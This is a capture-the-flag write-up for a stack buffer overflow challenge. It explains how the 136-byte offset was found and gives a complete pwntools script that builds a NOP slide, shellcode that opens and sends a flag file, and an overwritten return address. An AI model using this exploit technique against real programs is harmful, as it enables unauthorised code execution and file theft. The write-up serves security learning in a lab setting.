# Hijack to Shellcode (hard)

#### Same as last challenge only no training wheels. Always the same, disassemble and find the padding. 0x80 (128) and 8 = 136. 
```asm
0x000000000040149d <+179>:   mov    -0x8(%rbp),%rdx
0x00000000004014a1 <+183>:   lea    -0x80(%rbp),%rax
```
---------------------------------------------

#### Initially because there is no address given I thought to "trampoline" to get the flag. Basically run the challenge with 136 bytes of 'A' and then 8 bytes of 'B' and then another 100 bytes of 'C' which will crash it. Run info registers and see which are pointing to the stack '0x7ff.....". x/s $(whatever register) and see which ones have the data sent (the A's B's and C's). Once found, run an objdump on the program and grep for jmp rsp and use this to bounce the pointer onto the shellcode. However, after investigating more and trying different methods, I found that pushing or poping the pointer anywhere wasnt possible. Instead, I used a NOP slide.
```python
from pwn import *
import sys

context.arch = 'amd64'

asmbly = """
xor rsi, rsi
push rsi
mov rdi, 0x67616c662f2f2f2f
push rdi
mov rdi, rsp
push 2
pop rax
xor rdx, rdx
syscall

mov rsi, rax
push 1
pop rdi
xor r10, r10
mov r10w, 1000
push 40
pop rax
xor rdx, rdx
syscall

push 60
pop rax
syscall
"""

asmbly = asm(asmbly)
nops = b'\x90' * 64
cur_len = len(nops) + len(asmbly)
pad = b'A' * (136 - cur_len)
t_addr = p64(0x7fffffffd9b0 + 32)
sys.stdout.buffer.write(nops + asmbly + pad + t_addr)
```
